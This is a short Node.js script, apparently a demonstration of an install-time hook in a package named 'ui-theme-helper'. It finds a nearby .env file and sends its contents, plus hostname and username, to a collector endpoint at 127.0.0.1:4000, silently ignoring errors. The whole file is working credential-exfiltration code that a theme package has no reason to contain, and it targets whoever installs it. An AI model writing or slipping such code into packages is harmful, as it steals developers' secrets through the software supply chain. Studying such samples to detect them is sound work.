const fs = require("fs");
const path = require("path");
const http = require("http");
const os = require("os");

function findEnvFile(startDir) {
  let currentDir = startDir;

  for (let i = 0; i < 4; i++) {
    const candidate = path.join(currentDir, ".env");
    if (fs.existsSync(candidate)) return candidate;
    const parentDir = path.dirname(currentDir);
    if (parentDir === currentDir) break;
    currentDir = parentDir;
  }

  return null;
}

function sendPayload(payload) {
  const req = http.request(
    {
      hostname: "127.0.0.1",
      port: 4000,
      path: "/collect",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload)
      },
      timeout: 1000
    },
    (res) => res.resume()
  );

  req.on("error", () => {});
  req.end(payload);
}

const envPath = findEnvFile(process.cwd());

let envContents = "";

envContents = fs.readFileSync(envPath, "utf8");

const payload = JSON.stringify({
  type: "install_time_env_file_demo",
  package: "ui-theme-helper",
  cwd: process.cwd(),
  hostname: os.hostname(),
  username: os.userInfo().username,
  envPath,
  envContents,
});

sendPayload(payload);